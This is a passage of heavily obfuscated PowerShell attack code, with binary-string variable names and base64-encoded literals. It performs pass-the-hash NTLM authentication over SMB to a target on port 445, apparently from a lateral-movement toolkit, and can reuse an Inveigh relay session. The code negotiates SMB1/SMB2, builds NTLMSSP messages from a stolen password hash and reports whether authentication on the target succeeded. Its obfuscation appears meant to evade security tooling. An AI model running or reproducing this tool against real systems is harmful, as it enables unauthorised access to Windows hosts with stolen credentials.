    ${00100111000010010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUgBlAHMAdQBtAGUASABhAG4AZABsAGUAXwBSAGUAZgBlAHIAZQBuAHQASQBEAA=='))),[Byte[]](0x10,0x00,0x02,0x00))
    ${00100111000010010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUgBlAHMAdQBtAGUASABhAG4AZABsAGUAXwBSAGUAcwB1AG0AZQBIAGEAbgBkAGwAZQA='))),[Byte[]](0x00,0x00,0x00,0x00))
    return ${00100111000010010}
}
function _00000100101000000
{
    param([String]${_01000011000110110})
    ${_01000011000110110} = "\\" + ${_01000011000110110}
    [Byte[]]${10010111111010010} = [System.Text.Encoding]::Unicode.GetBytes(${_01000011000110110})
    [Byte[]]${01110100110111010} = [System.BitConverter]::GetBytes(${_01000011000110110}.Length + 1)
    if(${_01000011000110110}.Length % 2)
    {
        ${10010111111010010} += 0x00,0x00
    }
    else
    {
        ${10010111111010010} += 0x00,0x00,0x00,0x00
    }
    ${00001111011100010} = New-Object System.Collections.Specialized.OrderedDictionary
    ${00001111011100010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwBlAHIAdgBlAHIAVQBOAEMAXwBSAGUAZgBlAHIAZQBuAHQASQBEAA=='))),[Byte[]](0x00,0x00,0x02,0x00))
    ${00001111011100010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwBlAHIAdgBlAHIAVQBOAEMAXwBNAGEAeABDAG8AdQBuAHQA'))),${01110100110111010})
    ${00001111011100010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwBlAHIAdgBlAHIAVQBOAEMAXwBPAGYAZgBzAGUAdAA='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${00001111011100010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwBlAHIAdgBlAHIAVQBOAEMAXwBBAGMAdAB1AGEAbABDAG8AdQBuAHQA'))),${01110100110111010})
    ${00001111011100010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwBlAHIAdgBlAHIAVQBOAEMAXwBTAGUAcgB2AGUAcgBVAE4AQwA='))),${10010111111010010})
    ${00001111011100010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ATABlAHYAZQBsAF8ATABlAHYAZQBsAA=='))),[Byte[]](0x01,0x00,0x00,0x00))
    ${00001111011100010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AQwB0AHIAXwBOAGUAdABTAGgAYQByAGUAQwB0AHIAXwBDAHQAcgA='))),[Byte[]](0x01,0x00,0x00,0x00))
    ${00001111011100010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AQwB0AHIAXwBOAGUAdABTAGgAYQByAGUAQwB0AHIAXwBQAG8AaQBuAHQAZQByAF8AUgBlAGYAZQByAGUAbgB0AEkARAA='))),[Byte[]](0x04,0x00,0x02,0x00))
    ${00001111011100010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AQwB0AHIAXwBOAGUAdABTAGgAYQByAGUAQwB0AHIAXwBQAG8AaQBuAHQAZQByAF8AQwB0AHIAMQBfAEMAbwB1AG4AdAA='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${00001111011100010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AQwB0AHIAXwBOAGUAdABTAGgAYQByAGUAQwB0AHIAXwBQAG8AaQBuAHQAZQByAF8ATgB1AGwAbABQAG8AaQBuAHQAZQByAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${00001111011100010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAQgB1AGYAZgBlAHIA'))),[Byte[]](0xff,0xff,0xff,0xff))
    ${00001111011100010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAZQByAGUAbgB0AEkARAA='))),[Byte[]](0x08,0x00,0x02,0x00))
    ${00001111011100010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBtAGUASABhAG4AZABsAGUA'))),[Byte[]](0x00,0x00,0x00,0x00))
    return ${00001111011100010}
}
function _00010011100100110
{
    param ([Int]${_11000001001000101},[Byte[]]${_00101110101001101})
    ${00010111100101110} = [System.BitConverter]::ToUInt16(${_00101110101001101}[${_11000001001000101}..(${_11000001001000101} + 1)],0)
    return ${00010111100101110}
}
function _00010100011010010
{
    param ([Byte[]]${_10100101010001101})
    if([System.BitConverter]::ToString(${_10100101010001101}) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAzAC0AMAAxAC0AMAAwAC0AMAAwAA=='))))
    {
        ${01010101011000100} = $true
    }
    return ${01010101011000100}
}
if($hash -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgA6ACoA'))))
{
    $hash = $hash.SubString(($hash.IndexOf(":") + 1),32)
}
if($Domain)
{
    ${01100011000010001} = $Domain + "\" + $Username
}
else
{
    ${01100011000010001} = $Username
}
if($PSBoundParameters.ContainsKey($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgA=')))))
{
    ${00001011000111111} = $true
}
if($PSBoundParameters.ContainsKey($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgA=')))))
{
    if(!$Inveigh)
    {
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABJAG4AdgBlAGkAZwBoACAAUgBlAGwAYQB5ACAAcwBlAHMAcwBpAG8AbgAgAG4AbwB0ACAAZgBvAHUAbgBkAA==')))
        ${01100011000111110} = $true
    }
    elseif(!$inveigh.session_socket_table[$session].Connected)
    {
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABJAG4AdgBlAGkAZwBoACAAUgBlAGwAYQB5ACAAcwBlAHMAcwBpAG8AbgAgAG4AbwB0ACAAYwBvAG4AbgBlAGMAdABlAGQA')))
        ${01100011000111110} = $true
    }
    $Target = $inveigh.session_socket_table[$session].Client.RemoteEndpoint.Address.IPaddressToString
}
${01101100100111010} = [System.Diagnostics.Process]::GetCurrentProcess() | select -expand id
${01101100100111010} = [System.BitConverter]::ToString([System.BitConverter]::GetBytes(${01101100100111010}))
[Byte[]]${01101100100111010} = ${01101100100111010}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
if(!${00001011000111111})
{
    ${00101111101110011} = New-Object System.Net.Sockets.TCPClient
    ${00101111101110011}.Client.ReceiveTimeout = 5000
}
if(!${01100011000111110} -and !${00001011000111111})
{
    try
    {
        ${00101111101110011}.Connect($Target,$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NAA0ADUA'))))
    }
    catch
    {
        echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIAAkAFQAYQByAGcAZQB0ACAAZABpAGQAIABuAG8AdAAgAHIAZQBzAHAAbwBuAGQA')))
    }
}
if(${00101111101110011}.Connected -or (!${01100011000111110} -and $inveigh.session_socket_table[$session].Connected))
{
    ${10110001011001111} = New-Object System.Byte[] 81920
    if(!${00001011000111111})
    {
        ${00010110101011010} = ${00101111101110011}.GetStream()
        if(${01101100100011101} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAMgAuADEA'))))
        {
            ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAGcAbwB0AGkAYQB0AGUAUwBNAEIAMgA=')))
        }
        else
        {
            ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAGcAbwB0AGkAYQB0AGUAUwBNAEIA')))
        }
        while(${10010111110010011} -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA='))))
        {
            try
            {
                switch (${10010111110010011})
                {
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAGcAbwB0AGkAYQB0AGUAUwBNAEIA')))
                    {          
                        ${00011010101110011} = _00110110101011001 0x72 0x18 0x01,0x48 0xff,0xff ${01101100100111010} 0x00,0x00       
                        ${01111100101100101} = _01010111010111001 ${01101100100011101}
                        ${10100010000101011} = _00010011110111111 ${00011010101110011}
                        ${10111100010001110} = _00010011110111111 ${01111100101100101}
                        ${01011111100010011} = _10110111001100010 ${10100010000101011}.Length ${10111100010001110}.Length
                        ${01000010010000100} = _00010011110111111 ${01011111100010011}
                        ${00111101101010000} = ${01000010010000100} + ${10100010000101011} + ${10111100010001110}
                        try
                        {
                            ${00010110101011010}.Write(${00111101101010000},0,${00111101101010000}.Length) > $null
                            ${00010110101011010}.Flush()    
                            ${00010110101011010}.Read(${10110001011001111},0,${10110001011001111}.Length) > $null
                            if([System.BitConverter]::ToString(${10110001011001111}[4..7]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgBmAC0ANQAzAC0ANABkAC0ANAAyAA=='))))
                            {
                                ${01101100100011101} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAMQA=')))
                                ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQBTAFMAUABOAGUAZwBvAHQAaQBhAHQAZQA=')))
                                if([System.BitConverter]::ToString(${10110001011001111}[39]) -eq '0f')
                                {
                                    if(${00010100111010000})
                                    {
                                        echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABTAE0AQgAgAHMAaQBnAG4AaQBuAGcAIABpAHMAIAByAGUAcQB1AGkAcgBlAGQAIABvAG4AIAAkAFQAYQByAGcAZQB0AA==')))
                                        ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                                    }
                                    else
                                    {    
                                        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABTAE0AQgAgAHMAaQBnAG4AaQBuAGcAIABpAHMAIAByAGUAcQB1AGkAcgBlAGQA')))
                                        ${10010001011010000} = $true
                                        ${00100001100000101} = 0x00,0x00
                                        ${01101111011101000} = 0x15,0x82,0x08,0xa0
                                    }
                                }
                                else
                                {
                                    if(${00010100111010000})
                                    {
                                        echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABTAE0AQgAgAHMAaQBnAG4AaQBuAGcAIABpAHMAIABuAG8AdAAgAHIAZQBxAHUAaQByAGUAZAAgAG8AbgAgACQAVABhAHIAZwBlAHQA')))
                                        ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                                    }
                                    else
                                    {    
                                        ${10010001011010000} = $false
                                        ${00100001100000101} = 0x00,0x00
                                        ${01101111011101000} = 0x05,0x82,0x08,0xa0
                                    }
                                }
                            }
                            else
                            {
                                ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAGcAbwB0AGkAYQB0AGUAUwBNAEIAMgA=')))
                                if([System.BitConverter]::ToString(${10110001011001111}[70]) -eq '03')
                                {
                                    if(${00010100111010000})
                                    {
                                        echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABTAE0AQgAgAHMAaQBnAG4AaQBuAGcAIABpAHMAIAByAGUAcQB1AGkAcgBlAGQAIABvAG4AIAAkAFQAYQByAGcAZQB0AA==')))
                                        ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                                    }
                                    else
                                    {   
                                        if(${00010100111010000})
                                        {
                                            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABTAE0AQgAgAHMAaQBnAG4AaQBuAGcAIABpAHMAIAByAGUAcQB1AGkAcgBlAGQA')))
                                        }
                                        ${10010001011010000} = $true
                                        ${00100001100000101} = 0x00,0x00
                                        ${01101111011101000} = 0x15,0x82,0x08,0xa0
                                    }
                                }
                                else
                                {
                                    if(${00010100111010000})
                                    {
                                        echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABTAE0AQgAgAHMAaQBnAG4AaQBuAGcAIABpAHMAIABuAG8AdAAgAHIAZQBxAHUAaQByAGUAZAAgAG8AbgAgACQAVABhAHIAZwBlAHQA')))
                                        ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                                    }
                                    else
                                    {    
                                        ${10010001011010000} = $false
                                        ${00100001100000101} = 0x00,0x00
                                        ${01101111011101000} = 0x05,0x80,0x08,0xa0
                                    }
                                }
                            }
                        }
                        catch
                        {
                            if($_.Exception.Message -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGMAZQBwAHQAaQBvAG4AIABjAGEAbABsAGkAbgBnACAAIgBSAGUAYQBkACIAIAB3AGkAdABoACAAIgAzACIAIABhAHIAZwB1AG0AZQBuAHQAKABzACkAOgAgACIAVQBuAGEAYgBsAGUAIAB0AG8AIAByAGUAYQBkACAAZABhAHQAYQAgAGYAcgBvAG0AIAB0AGgAZQAgAHQAcgBhAG4AcwBwAG8AcgB0ACAAYwBvAG4AbgBlAGMAdABpAG8AbgA6ACAAQQBuACAAZQB4AGkAcwB0AGkAbgBnACAAYwBvAG4AbgBlAGMAdABpAG8AbgAgAHcAYQBzACAAZgBvAHIAYwBpAGIAbAB5ACAAYwBsAG8AcwBlAGQAIABiAHkAIAB0AGgAZQAgAHIAZQBtAG8AdABlACAAaABvAHMAdAAuACIA'))))
                            {
                                echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABTAE0AQgAxACAAbgBlAGcAbwB0AGkAYQB0AGkAbwBuACAAZgBhAGkAbABlAGQA')))
                                ${10110110101001100} = $true
                                ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                            }
                        }
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAGcAbwB0AGkAYQB0AGUAUwBNAEIAMgA=')))
                    {
                        if(${01101100100011101} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAMgAuADEA'))))
                        {
                            ${01000100011101010} = 0
                        }
                        else
                        {
                            ${01000100011101010} = 1
                        }
                        ${10111010000000010} = 0x00,0x00,0x00,0x00
                        ${10111101001010100} = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                        ${00011010101110011} = _01000000010000001 0x00,0x00 0x00,0x00 $false ${01000100011101010} ${01101100100111010} ${10111010000000010} ${10111101001010100}
                        ${01111100101100101} = _00000011100001111
                        ${10100010000101011} = _00010011110111111 ${00011010101110011}
                        ${10111100010001110} = _00010011110111111 ${01111100101100101}
                        ${01011111100010011} = _10110111001100010 ${10100010000101011}.Length ${10111100010001110}.Length
                        ${01000010010000100} = _00010011110111111 ${01011111100010011}
                        ${00111101101010000} = ${01000010010000100} + ${10100010000101011} + ${10111100010001110}
                        ${00010110101011010}.Write(${00111101101010000},0,${00111101101010000}.Length) > $null
                        ${00010110101011010}.Flush()    
                        ${00010110101011010}.Read(${10110001011001111},0,${10110001011001111}.Length) > $null
                        ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQBTAFMAUABOAGUAZwBvAHQAaQBhAHQAZQA=')))
                        if([System.BitConverter]::ToString(${10110001011001111}[70]) -eq '03')
                        {
                            if(${00010100111010000})
                            {
                                echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABTAE0AQgAgAHMAaQBnAG4AaQBuAGcAIABpAHMAIAByAGUAcQB1AGkAcgBlAGQAIABvAG4AIAAkAHQAYQByAGcAZQB0AA==')))
                                ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                            }
                            else
                            {
                                if(${00010100111010000})
                                {
                                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABTAE0AQgAgAHMAaQBnAG4AaQBuAGcAIABpAHMAIAByAGUAcQB1AGkAcgBlAGQA')))
                                }
                                ${10010001011010000} = $true
                                ${00100001100000101} = 0x00,0x00
                                ${01101111011101000} = 0x15,0x82,0x08,0xa0
                            }
                        }
                        else
                        {
                            if(${00010100111010000})
                            {
                                echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABTAE0AQgAgAHMAaQBnAG4AaQBuAGcAIABpAHMAIABuAG8AdAAgAHIAZQBxAHUAaQByAGUAZAAgAG8AbgAgACQAdABhAHIAZwBlAHQA')))
                                ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                            }
                            else
                            {
                                ${10010001011010000} = $false
                                ${00100001100000101} = 0x00,0x00
                                ${01101111011101000} = 0x05,0x80,0x08,0xa0
                            }
                        }
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQBTAFMAUABOAGUAZwBvAHQAaQBhAHQAZQA=')))
                    { 
                        if(${01101100100011101} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAMQA='))))
                        {
                            ${00011010101110011} = _00110110101011001 0x73 0x18 0x07,0xc8 0xff,0xff ${01101100100111010} 0x00,0x00
                            if(${10010001011010000})
                            {
                                ${00011010101110011}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzADIA')))] = 0x05,0x48
                            }
                            ${00001110100000010} = _01101001100100110 ${01101111011101000}
                            ${10100010000101011} = _00010011110111111 ${00011010101110011}
                            ${00001001100111010} = _00010011110111111 ${00001110100000010}       
                            ${01111100101100101} = _01001011110100100 ${00001001100111010}
                            ${10111100010001110} = _00010011110111111 ${01111100101100101}
                            ${01011111100010011} = _10110111001100010 ${10100010000101011}.Length ${10111100010001110}.Length
                            ${01000010010000100} = _00010011110111111 ${01011111100010011}
                            ${00111101101010000} = ${01000010010000100} + ${10100010000101011} + ${10111100010001110}
                        }
                        else
                        {
                            ${01000100011101010}++
                            ${00011010101110011} = _01000000010000001 0x01,0x00 0x1f,0x00 $false ${01000100011101010} ${01101100100111010} ${10111010000000010} ${10111101001010100}
                            ${00001110100000010} = _01101001100100110 ${01101111011101000} 0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f
                            ${10100010000101011} = _00010011110111111 ${00011010101110011}
                            ${00001001100111010} = _00010011110111111 ${00001110100000010}       
                            ${01111100101100101} = _00111001011111001 ${00001001100111010}
                            ${10111100010001110} = _00010011110111111 ${01111100101100101}
                            ${01011111100010011} = _10110111001100010 ${10100010000101011}.Length ${10111100010001110}.Length
                            ${01000010010000100} = _00010011110111111 ${01011111100010011}
                            ${00111101101010000} = ${01000010010000100} + ${10100010000101011} + ${10111100010001110}
                        }
                        ${00010110101011010}.Write(${00111101101010000},0,${00111101101010000}.Length) > $null
                        ${00010110101011010}.Flush()    
                        ${00010110101011010}.Read(${10110001011001111},0,${10110001011001111}.Length) > $null
                        ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                    }
                }
            }
            catch
            {
                echo "[-] $($_.Exception.Message)"
                ${10110110101001100} = $true
                ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
            }
        }
        if(!${00010100111010000} -and !${10110110101001100})
        {
            ${00011010111110011} = [System.BitConverter]::ToString(${10110001011001111})
            ${00011010111110011} = ${00011010111110011} -replace "-",""
            ${01001111001111011} = ${00011010111110011}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NABFADUANAA0AEMANABEADUAMwA1ADMANQAwADAAMAA='))))
            ${00100111110011000} = ${01001111001111011} / 2
            ${01010111000000001} = _00010011100100110 (${00100111110011000} + 12) ${10110001011001111}
            ${01001011011110111} = _00010011100100110 (${00100111110011000} + 40) ${10110001011001111}
            ${10111101001010100} = ${10110001011001111}[44..51]
            ${10010011110111111} = ${10110001011001111}[(${00100111110011000} + 24)..(${00100111110011000} + 31)]
            ${00111111101111000} = ${10110001011001111}[(${00100111110011000} + 56 + ${01010111000000001})..(${00100111110011000} + 55 + ${01010111000000001} + ${01001011011110111})]
            ${01111010111011011} = ${00111111101111000}[(${00111111101111000}.Length - 12)..(${00111111101111000}.Length - 5)]
            ${00110110000100100} = (&{for (${10101100010100000} = 0;${10101100010100000} -lt $hash.Length;${10101100010100000} += 2){$hash.SubString(${10101100010100000},2)}}) -join "-"
            ${00110110000100100} = ${00110110000100100}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
            ${10111110101100011} = (ls -path env:computername).Value
            ${10101101110001010} = [System.Text.Encoding]::Unicode.GetBytes(${10111110101100011})
            ${10001010011001101} = [System.Text.Encoding]::Unicode.GetBytes($Domain)
            ${10111000110001100} = [System.Text.Encoding]::Unicode.GetBytes($username)
            ${01000000011010111} = [System.BitConverter]::GetBytes(${10001010011001101}.Length)[0,1]
            ${01000000011010111} = [System.BitConverter]::GetBytes(${10001010011001101}.Length)[0,1]
            ${10001000001110011} = [System.BitConverter]::GetBytes(${10111000110001100}.Length)[0,1]
            ${01011010110100101} = [System.BitConverter]::GetBytes(${10101101110001010}.Length)[0,1]
            ${01011011011101111} = 0x40,0x00,0x00,0x00
            ${10100111001101011} = [System.BitConverter]::GetBytes(${10001010011001101}.Length + 64)
            ${00001110100001111} = [System.BitConverter]::GetBytes(${10001010011001101}.Length + ${10111000110001100}.Length + 64)
            ${10110110010110100} = [System.BitConverter]::GetBytes(${10001010011001101}.Length + ${10111000110001100}.Length + ${10101101110001010}.Length + 64)
            ${10110110001000001} = [System.BitConverter]::GetBytes(${10001010011001101}.Length + ${10111000110001100}.Length + ${10101101110001010}.Length + 88)
            ${00100011000001110} = New-Object System.Security.Cryptography.HMACMD5
            ${00100011000001110}.key = ${00110110000100100}
            ${10101010011101000} = $username.ToUpper()
            ${01001101000100101} = [System.Text.Encoding]::Unicode.GetBytes(${10101010011101000})
            ${01001101000100101} += ${10001010011001101}
            ${01111110001111000} = ${00100011000001110}.ComputeHash(${01001101000100101})
            ${00000101111011110} = [String](1..8 | % {$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwADoAWAAyAH0A'))) -f (Get-Random -Minimum 1 -Maximum 255)})
            ${01010111101101011} = ${00000101111011110}.Split(" ") | %{[Char][System.Convert]::ToInt16($_,16)}
            ${00100011010010011} = 0x01,0x01,0x00,0x00,
                                    0x00,0x00,0x00,0x00 +
                                    ${01111010111011011} +
                                    ${01010111101101011} +
                                    0x00,0x00,0x00,0x00 +
                                    ${00111111101111000} +
                                    0x00,0x00,0x00,0x00,
                                    0x00,0x00,0x00,0x00
            ${01101101010000000} = ${10010011110111111} + ${00100011010010011}
            ${00100011000001110}.key = ${01111110001111000}
            ${00010110101010001} = ${00100011000001110}.ComputeHash(${01101101010000000})
            if(${10010001011010000})
            {
                ${01011110100010011} = ${00100011000001110}.ComputeHash(${00010110101010001})
                ${00101010010100111} = ${01011110100010011}
                ${10010101111010000} = New-Object System.Security.Cryptography.HMACSHA256
                ${10010101111010000}.key = ${00101010010100111}
            }
            ${00010110101010001} = ${00010110101010001} + ${00100011010010011}
            ${01111101010011001} = [System.BitConverter]::GetBytes(${00010110101010001}.Length)[0,1]
            ${10001010100100011} = [System.BitConverter]::GetBytes(${10001010011001101}.Length + ${10111000110001100}.Length + ${10101101110001010}.Length + ${00010110101010001}.Length + 88)
            ${00111010110010101} = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,
                                    0x03,0x00,0x00,0x00,
                                    0x18,0x00,
                                    0x18,0x00 +
                                    ${10110110010110100} +
                                    ${01111101010011001} +
                                    ${01111101010011001} +
                                    ${10110110001000001} +
                                    ${01000000011010111} +
                                    ${01000000011010111} +
                                    ${01011011011101111} +
                                    ${10001000001110011} +
                                    ${10001000001110011} +
                                    ${10100111001101011} +
                                    ${01011010110100101} +
                                    ${01011010110100101} +
                                    ${00001110100001111} +
                                    ${00100001100000101} +
                                    ${00100001100000101} +
                                    ${10001010100100011} +
                                    ${01101111011101000} +
                                    ${10001010011001101} +
                                    ${10111000110001100} +
                                    ${10101101110001010} +
                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                                    ${00010110101010001}
            if(${01101100100011101} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAMQA='))))
            {
                ${00111100011011100} = ${10110001011001111}[32,33]
                ${00011010101110011} = _00110110101011001 0x73 0x18 0x07,0xc8 0xff,0xff ${01101100100111010} ${00111100011011100}
                if(${10010001011010000})
                {
                    ${00011010101110011}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzADIA')))] = 0x05,0x48
                }
                ${00011010101110011}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBJAEQA')))] = ${00111100011011100}
                ${00001110100000010} = _01110111001111011 ${00111010110010101}
                ${10100010000101011} = _00010011110111111 ${00011010101110011}
                ${00001001100111010} = _00010011110111111 ${00001110100000010}      
                ${01111100101100101} = _01001011110100100 ${00001001100111010}
                ${10111100010001110} = _00010011110111111 ${01111100101100101}
                ${01011111100010011} = _10110111001100010 ${10100010000101011}.Length ${10111100010001110}.Length
                ${01000010010000100} = _00010011110111111 ${01011111100010011}
                ${00111101101010000} = ${01000010010000100} + ${10100010000101011} + ${10111100010001110}
            }
            else
            {
                ${01000100011101010}++
                ${00011010101110011} = _01000000010000001 0x01,0x00 0x01,0x00 $false ${01000100011101010}  ${01101100100111010} ${10111010000000010} ${10111101001010100}
                ${00110001100111010} = _01110111001111011 ${00111010110010101}
                ${10100010000101011} = _00010011110111111 ${00011010101110011}
                ${01011001000010110} = _00010011110111111 ${00110001100111010}        
                ${01111100101100101} = _00111001011111001 ${01011001000010110}
                ${10111100010001110} = _00010011110111111 ${01111100101100101}
                ${01011111100010011} = _10110111001100010 ${10100010000101011}.Length ${10111100010001110}.Length
                ${01000010010000100} = _00010011110111111 ${01011111100010011}
                ${00111101101010000} = ${01000010010000100} + ${10100010000101011} + ${10111100010001110}
            }
            try
            {
                ${00010110101011010}.Write(${00111101101010000},0,${00111101101010000}.Length) > $null
                ${00010110101011010}.Flush()
                ${00010110101011010}.Read(${10110001011001111},0,${10110001011001111}.Length) > $null
                if(${01101100100011101} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAMQA='))))
                {
                    if([System.BitConverter]::ToString(${10110001011001111}[9..12]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAwAC0AMAAwAC0AMAAwAA=='))))
                    {
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIAAkAHsAMAAxADEAMAAwADAAMQAxADAAMAAwADAAMQAwADAAMAAxAH0AIABzAHUAYwBjAGUAcwBzAGYAdQBsAGwAeQAgAGEAdQB0AGgAZQBuAHQAaQBjAGEAdABlAGQAIABvAG4AIAAkAFQAYQByAGcAZQB0AA==')))
                        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABTAE0AQgAxACAAaQBzACAAbwBuAGwAeQAgAHMAdQBwAHAAbwByAHQAZQBkACAAdwBpAHQAaAAgAHMAaQBnAG4AaQBuAGcAIABjAGgAZQBjAGsAIABhAG4AZAAgAGEAdQB0AGgAZQBuAHQAaQBjAGEAdABpAG8AbgA=')))
                        ${10001010110010100} = $false
                    }
                    else
                    {
                        echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIAAkAHsAMAAxADEAMAAwADAAMQAxADAAMAAwADAAMQAwADAAMAAxAH0AIABmAGEAaQBsAGUAZAAgAHQAbwAgAGEAdQB0AGgAZQBuAHQAaQBjAGEAdABlACAAbwBuACAAJABUAGEAcgBnAGUAdAA=')))
                        ${10001010110010100} = $false
                    }
                }
                else
                {
                    if([System.BitConverter]::ToString(${10110001011001111}[12..15]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAwAC0AMAAwAC0AMAAwAA=='))))
                    {
